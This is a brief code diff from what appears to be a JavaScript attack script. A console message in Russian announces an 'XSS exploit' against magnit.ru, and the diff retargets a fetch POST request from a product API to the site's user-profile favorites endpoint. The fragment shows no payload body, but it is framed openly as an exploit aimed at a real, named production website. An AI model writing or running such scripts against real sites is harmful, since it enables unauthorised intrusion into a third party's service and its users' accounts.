@@ -12,7 +12,7 @@
             console.log('🚀 Запуск XSS-эксплойта для magnit.ru');
             
             // Отправляем XSS-запрос напрямую
-            fetch('https://magnit.ru/webgate/v2/goods/get', {
+            fetch('https://magnit.ru/profile/favorites', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
